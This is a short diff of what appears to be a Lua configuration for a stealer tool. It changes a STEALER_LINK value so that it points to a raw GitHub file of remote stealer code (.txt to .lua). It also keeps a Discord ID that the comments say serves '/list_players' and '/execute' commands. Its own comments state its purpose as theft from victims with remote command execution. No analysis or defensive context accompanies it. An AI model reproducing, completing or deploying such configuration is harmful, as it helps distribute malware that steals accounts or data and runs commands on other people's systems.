@@ -1,4 +1,4 @@
-STEALER_LINK = 'https://raw.githubusercontent.com/kasperscripts/newupdate/refs/heads/main/v2.txt' -- stealer link (how to create is bellow)
+STEALER_LINK = 'https://raw.githubusercontent.com/kasperscripts/newupdate/refs/heads/main/v2.lua' -- stealer link (how to create is bellow)
 
 DISCORD_ID = '1352203517196238889' -- THIS IS NOT IMPORTANT (its for /list_players and /execute commads!)
 
